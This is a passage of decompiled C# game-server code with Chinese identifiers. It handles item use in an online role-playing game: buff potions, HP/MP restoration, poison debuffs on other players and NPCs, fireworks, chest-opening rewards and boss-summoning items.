						int num39 = 1800000;
						if (追加状态列表.ContainsKey(1000000831))
						{
							break;
						}
						状态效果(BitConverter.GetBytes(1000000831), 1, num39);
						追加状态类 追加状态类55 = new 追加状态类(this, num39, 1000000831, 1);
						追加状态列表.Add(追加状态类55.FLD_PID, 追加状态类55);
						base.人物追加最大_HP += 50;
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1000000832:
					{
						int num38 = 600000;
						if (追加状态列表.ContainsKey(1000000832))
						{
							break;
						}
						状态效果(BitConverter.GetBytes(1000000832), 1, num38);
						追加状态类 追加状态类53 = new 追加状态类(this, num38, 1000000832, 1);
						追加状态列表.Add(追加状态类53.FLD_PID, 追加状态类53);
						base.人物追加最大_HP += 100;
						base.人物追加最大_MP += 100;
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1000000833:
					{
						int num35 = 600000;
						if (追加状态列表.ContainsKey(1000000833) || 追加状态列表.ContainsKey(1000000834))
						{
							break;
						}
						状态效果(BitConverter.GetBytes(1000000833), 1, num35);
						追加状态类 追加状态类49 = new 追加状态类(this, num35, 1000000833, 1);
						追加状态列表.Add(追加状态类49.FLD_PID, 追加状态类49);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1000000834:
					{
						int num36 = 600000;
						if (追加状态列表.ContainsKey(1000000834) || 追加状态列表.ContainsKey(1000000833))
						{
							break;
						}
						状态效果(BitConverter.GetBytes(1000000834), 1, num36);
						追加状态类 追加状态类51 = new 追加状态类(this, num36, 1000000834, 1);
						追加状态列表.Add(追加状态类51.FLD_PID, 追加状态类51);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						goto IL_a6ab;
					}
					case 1000000835:
						if (base.Player_Sex == 2)
						{
							int num34 = 600000;
							if (追加状态列表.ContainsKey(1000000835))
							{
								break;
							}
							状态效果(BitConverter.GetBytes(1000000835), 1, num34);
							追加状态类 追加状态类45 = new 追加状态类(this, num34, 1000000835, 1);
							追加状态列表.Add(追加状态类45.FLD_PID, 追加状态类45);
							base.FLD_追加百分比_MP上限 += 0.05;
							计算人物装备数据();
							更新武功和状态();
							物品使用(num2, num3, 1);
						}
						else
						{
							系统提示("此药为女性专用药！", 10, "吃药提示");
						}
						goto IL_a6ab;
					case 1000000836:
						if (base.Player_Sex == 2)
						{
							int num32 = 600000;
							if (追加状态列表.ContainsKey(1000000836))
							{
								break;
							}
							状态效果(BitConverter.GetBytes(1000000836), 1, num32);
							追加状态类 追加状态类43 = new 追加状态类(this, num32, 1000000836, 1);
							追加状态列表.Add(追加状态类43.FLD_PID, 追加状态类43);
							base.FLD_追加百分比_HP上限 += 0.05;
							计算人物装备数据();
							更新武功和状态();
							物品使用(num2, num3, 1);
						}
						else
						{
							系统提示("此药为女性专用药！", 10, "吃药提示");
						}
						goto IL_a6ab;
					case 1000000837:
						加魔(1200);
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000838:
						加血(1200);
						物品使用(num2, num3, 1);
						吃药效果(num5);
						goto IL_a6ab;
					case 1000000839:
						if (!异常状态.ContainsKey(13) && !异常状态.ContainsKey(9) && !异常防御状态.ContainsKey(14) && !异常攻击状态.ContainsKey(13) && !异常攻击状态.ContainsKey(1) && !异常状态.ContainsKey(2) && !异常状态.ContainsKey(17) && !异常状态.ContainsKey(18) && !异常状态.ContainsKey(26) && !异常状态.ContainsKey(20) && !异常状态.ContainsKey(16))
						{
							系统提示("当前没有相应的中毒状态！", 10, "解毒提示");
						}
						else
						{
							异常状态列表();
							结束异常攻击状态列表();
							结束异常防御状态列表();
							结束异常掉蓝状态列表();
							结束异常掉血状态列表();
							物品使用(num2, num3, 1);
							更新武功和状态();
						}
						goto IL_a6ab;
					case 1000000841:
					{
						Players players8 = World.检查玩家世界ID(num4);
						if (players8 != null && num4 != base.人物全服ID && !players8.异常掉血状态.ContainsKey(12))
						{
							double ycztsll = (double)players8.人物_HP * 0.1;
							异常掉血状态类 异常掉血状态类3 = new 异常掉血状态类(players8, 1000, 12, 0);
							异常掉血状态类3.异常状态类掉血(ycztsll);
							players8.异常掉血状态.Add(12, 异常掉血状态类3);
							players8.更新HP_MP_SP();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000842:
					{
						Players players9 = World.检查玩家世界ID(num4);
						if (players9 != null && num4 != base.人物全服ID && !players9.异常攻击状态.ContainsKey(1) && !players9.异常攻击状态.ContainsKey(13))
						{
							异常状态攻击类 value14 = new 异常状态攻击类(players9, 60000, 13, 0);
							players9.异常攻击状态.Add(13, value14);
							players9.FLD_药品_减少攻击 -= 0.1;
							players9.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000843:
					{
						Players players7 = World.检查玩家世界ID(num4);
						if (players7 != null && num4 != base.人物全服ID && !players7.异常防御状态.ContainsKey(14))
						{
							异常状态防御类 value11 = new 异常状态防御类(players7, 60000, 14, 0);
							players7.异常防御状态.Add(14, value11);
							players7.FLD_药品_减少防御 -= 0.1;
							players7.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000844:
					{
						Players players5 = World.检查玩家世界ID(num4);
						if (players5 != null && num4 != base.人物全服ID && !players5.异常掉蓝状态.ContainsKey(16))
						{
							double num21 = (double)players5.人物最大_MP * 0.05;
							异常掉蓝状态类 异常掉蓝状态类 = new 异常掉蓝状态类(players5, 15000, 16, (int)num21);
							异常掉蓝状态类.异常状态类掉蓝(num21);
							players5.异常掉蓝状态.Add(16, 异常掉蓝状态类);
							players5.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000845:
					{
						Players players6 = World.检查玩家世界ID(num4);
						if (players6 != null && num4 != base.人物全服ID && !players6.异常状态.ContainsKey(17))
						{
							players6.异常状态 = new ThreadSafeDictionary<int, 异常状态类>();
							异常状态类 value10 = new 异常状态类(players6, 10000, 17, 0.0);
							players6.异常状态.Add(17, value10);
							players6.人物锁定 = true;
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000846:
					{
						Players players4 = World.检查玩家世界ID(num4);
						NpcClass value7;
						if (players4 != null && num4 != base.人物全服ID)
						{
							if (!players4.异常掉血状态.ContainsKey(18))
							{
								异常掉血状态类 异常掉血状态类2 = new 异常掉血状态类(players4, 30000, 18, 1);
								异常掉血状态类2.异常状态类掉血(100.0);
								players4.异常掉血状态.Add(18, 异常掉血状态类2);
								物品使用(num2, num3, 1);
							}
						}
						else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num4, out value7) && !value7.异常状态.ContainsKey(18))
						{
							异常状态类 异常状态类2 = new 异常状态类(value7, base.人物全服ID, 30000, 18, 1.0);
							异常状态类2.异常状态类出血(100.0);
							value7.异常状态.Add(18, 异常状态类2);
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000847:
					{
						Players players3 = World.检查玩家世界ID(num4);
						NpcClass value5;
						if (players3 != null && num4 != base.人物全服ID)
						{
							if (!players3.异常掉血状态.ContainsKey(18))
							{
								异常掉血状态类 异常掉血状态类 = new 异常掉血状态类(players3, 30000, 18, 1);
								异常掉血状态类.异常状态类掉血(150.0);
								players3.异常掉血状态.Add(18, 异常掉血状态类);
								物品使用(num2, num3, 1);
							}
						}
						else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num4, out value5) && !value5.异常状态.ContainsKey(18))
						{
							异常状态类 异常状态类 = new 异常状态类(value5, base.人物全服ID, 30000, 18, 1.0);
							异常状态类.异常状态类出血(150.0);
							value5.异常状态.Add(18, 异常状态类);
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000848:
					{
						Players players2 = World.检查玩家世界ID(num4);
						if (players2 != null && num4 != base.人物全服ID && !players2.异常掉蓝状态.ContainsKey(15))
						{
							double num13 = (double)players2.人物_MP * 0.1;
							异常掉蓝状态类 value4 = new 异常掉蓝状态类(players2, 1000, 15, 0);
							players2.异常掉蓝状态.Add(15, value4);
							players2.人物_MP -= (int)num13;
							players2.更新HP_MP_SP();
							players2.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000849:
					{
						Players players = World.检查玩家世界ID(num4);
						if (players != null && num4 != base.人物全服ID && !players.异常状态.ContainsKey(19))
						{
							异常状态类 value3 = new 异常状态类(players, 20000, 19, 0.0);
							players.异常状态.Add(19, value3);
							players.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000850:
					{
						Players players12 = World.检查玩家世界ID(num4);
						if (players12 != null && num4 != base.人物全服ID && !players12.异常状态.ContainsKey(20))
						{
							异常状态类 value28 = new 异常状态类(players12, 30000, 20, 0.0);
							players12.异常状态.Add(20, value28);
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000851:
					{
						Players players11 = World.检查玩家世界ID(num4);
						NpcClass value26;
						if (players11 != null && num4 != base.人物全服ID)
						{
							if (!players11.异常掉血状态.ContainsKey(18))
							{
								double num49 = (double)players11.人物最大_HP * 0.05;
								异常掉血状态类 异常掉血状态类4 = new 异常掉血状态类(players11, 30000, 18, (int)num49);
								异常掉血状态类4.异常状态类掉血(num49);
								players11.异常掉血状态.Add(18, 异常掉血状态类4);
								物品使用(num2, num3, 1);
							}
						}
						else if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(num4, out value26) && !value26.异常状态.ContainsKey(18))
						{
							异常状态类 异常状态类3 = new 异常状态类(value26, base.人物全服ID, 30000, 18, 100.0);
							异常状态类3.异常状态类出血(100.0);
							value26.异常状态.Add(18, 异常状态类3);
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000852:
					{
						Players players10 = World.检查玩家世界ID(num4);
						if (players10 != null && num4 != base.人物全服ID && !players10.异常攻击状态.ContainsKey(1) && !players10.异常攻击状态.ContainsKey(13))
						{
							异常状态攻击类 value24 = new 异常状态攻击类(players10, 60000, 1, 0);
							players10.异常攻击状态.Add(1, value24);
							players10.FLD_药品_减少攻击 -= 0.2;
							players10.更新武功和状态();
							物品使用(num2, num3, 1);
						}
						goto IL_a6ab;
					}
					case 1000000862:
						if (人物灵兽 != null && 人物灵兽.FLD_JOB == 5)
						{
							物品使用(num2, num3, 1);
							人物灵兽.FLD_ZCD += 50;
							if (人物灵兽.FLD_ZCD >= 2000)
							{
								人物灵兽.FLD_ZCD = 2000;
							}
							更新灵兽HP_MP_SP();
						}
						break;
					case 1000000714:
						升天武功点数++;
						物品使用(num2, num3, 1);
						更新武功和状态();
						break;
					case 1000000717:
						爆毒状态 = 0.01;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000718:
						爆毒状态 = 0.012;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000719:
						爆毒状态 = 0.014;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000720:
						爆毒状态 = 0.016;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000899:
					{
						物品类 物品类4 = 得到包裹物品(1000000426);
						if (物品类4 == null || 物品类4.物品位置 == num3)
						{
							break;
						}
						using (new Lock(World.开箱Lock, "锤子开箱Lock"))
						{
							减去物品(物品类4.物品位置, 1);
							物品使用(num2, num3, 1);
							OpenClass open2 = OpenClass.GetOpen(1000000899, base.Player_Job, base.Player_Zx);
							if (open2 != null)
							{
								ItmeClass value21;
								if (World.Itme.TryGetValue(open2.FLD_PIDX, out value21))
								{
									int num44 = open2.FLD_MAGIC1;
									int value22 = open2.FLD_MAGIC2;
									if (value21.FLD_RESIDE2 == 16)
									{
										if (num44 == 0)
										{
											switch (value21.FLD_PID)
											{
											case 800000001:
											case 800000002:
											case 800000011:
											case 800000012:
											case 800000013:
											case 800000023:
											case 800000024:
											case 800000028:
											case 800000030:
											case 800000031:
											case 800000032:
											case 800000033:
											case 800000061:
											case 800000062:
												num44 = World.GetValue(value21.FLD_PID, 6);
												break;
											}
										}
									}
									else
									{
										switch (value21.FLD_PID)
										{
										case 1000000321:
										{
											Random random5 = new Random();
											num44 = random5.Next(0, 1001);
											value22 = random5.Next(10, 51);
											break;
										}
										case 1000000323:
										{
											Random random4 = new Random();
											num44 = random4.Next(0, 1001);
											value22 = random4.Next(100, 151);
											break;
										}
										case 1000000325:
										{
											Random random3 = new Random();
											num44 = random3.Next(0, 1001);
											value22 = random3.Next(400, 700);
											break;
										}
										case 1000000327:
										{
											Random random2 = new Random();
											num44 = random2.Next(0, 1001);
											value22 = random2.Next(2000, 2500);
											break;
										}
										}
									}
									byte[] array15 = new byte[56];
									System.Buffer.BlockCopy(BitConverter.GetBytes(num44), 0, array15, 0, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(value22), 0, array15, 4, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_MAGIC3), 0, array15, 8, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_MAGIC4), 0, array15, 12, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_MAGIC5), 0, array15, 16, 4);
									if (open2.FLD_中级附魂 > 0)
									{
										System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array15, 22, 2);
										System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_中级附魂), 0, array15, 24, 4);
									}
									System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_中级附魂), 0, array15, 46, 4);
									System.Buffer.BlockCopy(BitConverter.GetBytes(open2.FLD_进化), 0, array15, 52, 4);
									增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(open2.FLD_PIDX), num3, BitConverter.GetBytes(open2.FLD_NUMBER), array15);
									if (open2.FLD_PIDX == 800000061 && num44 == 700040)
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用锤子砸开[封印宝箱]获得[" + open2.FLD_NAMEX.Trim() + "][WG40]");
									}
									else if (open2.FLD_PIDX == 800000062 && num44 == 1100100)
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用锤子砸开[封印宝箱]获得[" + open2.FLD_NAMEX.Trim() + "][WF100]");
									}
									else if (open2.FLD_PIDX != 700911 && open2.FLD_PIDX != 18 && open2.FLD_PIDX != 100026)
									{
										系统提示("用锤子砸开[封印宝箱]获得[" + open2.FLD_NAMEX.Trim() + "]。", 7, "系统提示");
									}
									else
									{
										World.全局提示("系统提示", 6, "[" + base.UserName + "]用锤子砸开[封印宝箱]获得[" + open2.FLD_NAMEX.Trim() + "]");
									}
								}
								else
								{
									Form1.WriteLine(1, "开箱 出错1 物品 [" + open2.FLD_PID + "][" + open2.FLD_NAME + "]开[" + open2.FLD_PIDX + "][" + open2.FLD_NAMEX + "] [" + base.Userid + "][" + base.UserName + "] ");
								}
							}
						}
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1000001176:
					case 1000001177:
					case 1000001178:
					case 1000001179:
					case 1000001180:
					case 1000001181:
					{
						物品类 物品类5 = 装备栏包裹[num3];
						if (物品类5 != null)
						{
							if (物品类5.Get物品ID != num5 || 物品类5.物品位置 != num3)
							{
								break;
							}
							byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
							int num46 = 得到包裹空位(this);
							int num47 = num5 - 6;
							if (num47 != 1000001170 && num47 != 1000001171 && num47 != 1000001172 && num47 != 1000001173 && num47 != 1000001174 && num47 != 1000001175)
							{
								break;
							}
							if (num46 != -1)
							{
								增加物品(bytes, BitConverter.GetBytes(num47), num46, BitConverter.GetBytes(1), 物品类5.物品属性);
								物品使用(num2, num3, 1);
							}
							else
							{
								系统提示("背包没有空位请清理一下.", 50, "");
							}
						}
						goto IL_a6ab;
					}
					case 1000000959:
						爆毒状态 = 0.018;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000960:
						爆毒状态 = 0.019;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000961:
						爆毒状态 = 0.02;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000962:
						爆毒状态 = 0.021;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000963:
						爆毒状态 = 0.022;
						物品使用(num2, num3, 1);
						爆毒数据包(num3);
						break;
					case 1000000910:
					case 1000000911:
					case 1000000912:
					case 1000000913:
					case 1000000914:
					case 1000000915:
						物品减去属性数量(num3, 1);
						烟花(num5, num4);
						break;
					case 1007000014:
					{
						if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006) || GetAddState(1007000014))
						{
							break;
						}
						物品减去属性数量(num3, 1);
						追加状态类 追加状态类52 = new 追加状态类(this, 3600000, num5, 1);
						追加状态列表.Add(追加状态类52.FLD_PID, 追加状态类52);
						base.人物追加最大_HP += 700;
						状态效果(array, 1, 3600000);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1000000901:
					case 1007000013:
						物品减去属性数量(num3, 1);
						烟花(num5, base.人物全服ID);
						break;
					case 1007000005:
					{
						if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006) || GetAddState(1008001814))
						{
							系统提示("存在相同的药品！");
							break;
						}
						物品减去属性数量(num3, 1);
						追加状态类 追加状态类48 = new 追加状态类(this, 3600000, num5, 1);
						追加状态列表.Add(追加状态类48.FLD_PID, 追加状态类48);
						base.人物追加最大_HP += 300;
						状态效果(array, 1, 3600000);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1007000006:
					{
						if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006) || GetAddState(1008001814))
						{
							系统提示("存在相同的药品！");
							break;
						}
						物品减去属性数量(num3, 1);
						追加状态类 追加状态类47 = new 追加状态类(this, 3600000, num5, 1);
						追加状态列表.Add(追加状态类47.FLD_PID, 追加状态类47);
						base.人物追加最大_HP += 500;
						状态效果(array, 1, 3600000);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1007000007:
					{
						if (GetAddState(1007000005) || GetAddState(1007000007) || GetAddState(1007000006) || GetAddState(1008001814))
						{
							系统提示("存在相同的药品！");
							break;
						}
						物品减去属性数量(num3, 1);
						追加状态类 追加状态类42 = new 追加状态类(this, 86400000, num5, 1);
						追加状态列表.Add(追加状态类42.FLD_PID, 追加状态类42);
						base.人物追加最大_HP += 700;
						状态效果(array, 1, 86400000);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000006:
					case 1008000008:
					case 1008000045:
					case 1008000069:
					{
						if (base.人物_MP >= base.人物最大_MP || (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						int num33 = base.人物最大_MP - base.人物_MP;
						加魔(num33);
						物品使用千年雪参(num3, num33);
						吃药效果(1000000104);
						goto IL_a6ab;
					}
					case 1008000003:
					case 1008000007:
					case 1008000044:
					case 1008000068:
					{
						if (base.人物_HP >= base.人物最大_HP || (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						int num28 = base.人物最大_HP - base.人物_HP;
						加血(num28);
						物品使用千年雪参(num3, num28);
						吃药效果(1000000101);
						goto IL_a6ab;
					}
					case 1008000053:
						if (GetAddState(1008000053))
						{
							物品减去属性数量(num3, 1);
							追加状态类 追加状态类40 = new 追加状态类(this, 3600000, num5, 1);
							追加状态列表.Add(追加状态类40.FLD_PID, 追加状态类40);
							状态效果(array, 1, 3600000);
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							更新武功和状态();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000054:
						if (!GetAddState(1008000054))
						{
							物品减去属性数量(num3, 1);
							追加状态类 追加状态类36 = new 追加状态类(this, 3600000, num5, 1);
							追加状态列表.Add(追加状态类36.FLD_PID, 追加状态类36);
							状态效果(array, 1, 3600000);
							base.FLD_人物_武功防御力增加百分比 += 0.1;
							更新武功和状态();
							RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						}
						break;
					case 1008000055:
					{
						if (追加状态列表 != null && (GetAddState(1007000005) || GetAddState(1008001814) || GetAddState(1008000016) || GetAddState(1008000017) || GetAddState(1008000018) || GetAddState(1008000019)))
						{
							系统提示("存在相同的药品！");
							break;
						}
						int num23 = 3600000;
						物品使用(num2, num3, 1);
						if (GetAddState(1007000005))
						{
							追加状态列表[1007000005].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1007000005), 1, num23);
						追加状态类 追加状态类25 = new 追加状态类(this, num23, 1007000005, 1);
						追加状态列表.Add(追加状态类25.FLD_PID, 追加状态类25);
						base.人物追加最大_HP += 300;
						if (GetAddState(1008000016))
						{
							追加状态列表[1008000016].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1008000016), 1, num23);
						追加状态类 追加状态类26 = new 追加状态类(this, num23, 1008000016, 1);
						追加状态列表.Add(追加状态类26.FLD_PID, 追加状态类26);
						addFLD_追加百分比_攻击(0.1);
						if (GetAddState(1008000017))
						{
							追加状态列表[1008000017].时间结束事件();
						}
						int num24;
						状态效果(BitConverter.GetBytes(1008000017), 1, num24 = num23 + 3000);
						追加状态类 追加状态类27 = new 追加状态类(this, num24, 1008000017, 1);
						追加状态列表.Add(追加状态类27.FLD_PID, 追加状态类27);
						addFLD_追加百分比_防御(0.1);
						if (GetAddState(1008000018))
						{
							追加状态列表[1008000018].时间结束事件();
						}
						int num25;
						状态效果(BitConverter.GetBytes(1008000018), 1, num25 = num24 + 3000);
						追加状态类 追加状态类28 = new 追加状态类(this, num25, 1008000018, 1);
						追加状态列表.Add(追加状态类28.FLD_PID, 追加状态类28);
						addFLD_装备_追加_武器_强化(2);
						if (GetAddState(1008000019))
						{
							追加状态列表[1008000019].时间结束事件();
						}
						int 时间2;
						状态效果(BitConverter.GetBytes(1008000019), 1, 时间2 = num25 + 3000);
						追加状态类 追加状态类29 = new 追加状态类(this, 时间2, 1008000019, 1);
						追加状态列表.Add(追加状态类29.FLD_PID, 追加状态类29);
						addFLD_装备_追加_防具_强化(1);
						计算人物装备数据();
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000082:
					{
						if (追加状态列表 != null && (GetAddState(1007000005) || GetAddState(1008001814) || GetAddState(1008000016) || GetAddState(1008000017) || GetAddState(1008000018) || GetAddState(1008000019)))
						{
							系统提示("存在相同的药品！");
							break;
						}
						int num16 = 86400000;
						物品使用(num2, num3, 1);
						if (GetAddState(1007000005))
						{
							追加状态列表[1007000005].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1007000005), 1, num16);
						追加状态类 追加状态类8 = new 追加状态类(this, num16, 1007000005, 1);
						追加状态列表.Add(追加状态类8.FLD_PID, 追加状态类8);
						base.人物追加最大_HP += 300;
						if (GetAddState(1008000016))
						{
							追加状态列表[1008000016].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1008000016), 1, num16);
						追加状态类 追加状态类9 = new 追加状态类(this, num16, 1008000016, 1);
						追加状态列表.Add(追加状态类9.FLD_PID, 追加状态类9);
						addFLD_追加百分比_攻击(0.1);
						if (GetAddState(1008000017))
						{
							追加状态列表[1008000017].时间结束事件();
						}
						int num17;
						状态效果(BitConverter.GetBytes(1008000017), 1, num17 = num16 + 3000);
						追加状态类 追加状态类10 = new 追加状态类(this, num17, 1008000017, 1);
						追加状态列表.Add(追加状态类10.FLD_PID, 追加状态类10);
						addFLD_追加百分比_防御(0.1);
						if (GetAddState(1008000018))
						{
							追加状态列表[1008000018].时间结束事件();
						}
						int num18;
						状态效果(BitConverter.GetBytes(1008000018), 1, num18 = num17 + 3000);
						追加状态类 追加状态类11 = new 追加状态类(this, num18, 1008000018, 1);
						追加状态列表.Add(追加状态类11.FLD_PID, 追加状态类11);
						addFLD_装备_追加_武器_强化(2);
						if (GetAddState(1008000019))
						{
							追加状态列表[1008000019].时间结束事件();
						}
						int 时间;
						状态效果(BitConverter.GetBytes(1008000019), 1, 时间 = num18 + 3000);
						追加状态类 追加状态类12 = new 追加状态类(this, 时间, 1008000019, 1);
						追加状态列表.Add(追加状态类12.FLD_PID, 追加状态类12);
						addFLD_装备_追加_防具_强化(1);
						计算人物装备数据();
						更新武功和状态();
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000078:
					{
						if (base.人物_MP >= base.人物最大_MP || (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						int num15 = base.人物最大_MP - base.人物_MP;
						加魔(num15);
						物品使用无双千年雪参(num3, num15);
						吃药效果(1000000104);
						if (GetAddState(1000000776))
						{
							追加状态列表[1000000776].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1000000776), 1, 10000);
						追加状态类 追加状态类7 = new 追加状态类(this, 10000, 1000000776, 0);
						追加状态列表.Add(追加状态类7.FLD_PID, 追加状态类7);
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						base.FLD_人物_武功防御力增加百分比 += 0.1;
						更新武功和状态();
						goto IL_a6ab;
					}
					case 1008000077:
					{
						if (base.人物_HP >= base.人物最大_HP || (int)DateTime.Now.Subtract(吃药时间).TotalMilliseconds < 100)
						{
							break;
						}
						吃药时间 = DateTime.Now;
						int num14 = base.人物最大_HP - base.人物_HP;
						加血(num14);
						物品使用无双九转丹(num3, num14);
						吃药效果(1000000101);
						if (GetAddState(1000000775))
						{
							追加状态列表[1000000775].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(1000000775), 1, 10000);
						追加状态类 追加状态类5 = new 追加状态类(this, 10000, 1000000775, 0);
						追加状态列表.Add(追加状态类5.FLD_PID, 追加状态类5);
						base.FLD_人物_追加_防御 += 20;
						更新武功和状态();
						goto IL_a6ab;
					}
					case 1008000127:
					{
						List<MonSterClss> list2 = new List<MonSterClss>();
						foreach (MonSterClss value31 in World.MonSter.Values)
						{
							if (value31.FLD_BOSS == 1)
							{
								list2.Add(value31);
							}
						}
						int index2 = new Random().Next(0, list2.Count);
						World.AddNpc(list2[index2].FLD_PID, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
						物品减去属性数量(num3, 1);
						break;
					}
					case 1008000110:
					{
						List<MonSterClss> list = new List<MonSterClss>();
						foreach (MonSterClss value32 in World.MonSter.Values)
						{
							if (value32.FLD_BOSS == 1)
							{
								list.Add(value32);
							}
						}
						int index = new Random().Next(0, list.Count);
						World.AddNpc(list[index].FLD_PID, base.人物坐标_X, base.人物坐标_Y, base.人物坐标_地图);
						物品减去属性数量(num3, 1);
						break;
					}
					case 1008000195:
					{
						if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000195) || GetAddState(1008000187))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类4 = new 追加状态类(this, 864000000, num5, 1);
						追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
						base.人物追加最大_HP += 300;
						addFLD_追加百分比_防御(0.05);
						int num9 = ++base.FLD_人物_追加_气功;
						更新气功();
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 864000000);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000197:
						if (追加状态New列表.Count > 0)
						{
							新吃药提示();
							break;
						}
						Set追加状态物品(1, 3600000, 10, 2);
						Set追加状态物品(2, 3600000, 15, 2);
						Set追加状态物品(3, 3600000, 700, 1);
						Set追加状态物品(7, 3600000, 5, 2);
						Set追加状态物品(8, 3600000, 10, 2);
						计算人物装备数据();
						更新武功和状态();
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					case 1008000183:
					{
						if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000195) || GetAddState(1008000187))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类69 = new 追加状态类(this, 864000000, num5, 1);
						追加状态列表.Add(追加状态类69.FLD_PID, 追加状态类69);
						base.人物追加最大_HP += 300;
						addFLD_追加百分比_防御(0.05);
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 864000000);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
						goto IL_a6ab;
					}
					case 1008000187:
					{
						if (GetAddState(1008000183) || GetAddState(1008000156) || GetAddState(1008000195) || GetAddState(1008000187))
						{
							新吃药提示();
							break;
						}
						追加状态类 追加状态类68 = new 追加状态类(this, 864000000, num5, 1);
						追加状态列表.Add(追加状态类68.FLD_PID, 追加状态类68);
						base.人物追加最大_HP += 300;
						int num9 = ++base.FLD_人物_追加_气功;
						更新气功();
						更新武功和状态();
						更新人物数据(this);
						更新广播人物数据();
						状态效果(array, 1, 864000000);
						物品使用(num2, num3, 1);
						RxjhClass.药品记录(base.Userid, base.UserName, num5, value.ItmeNAME, 1);
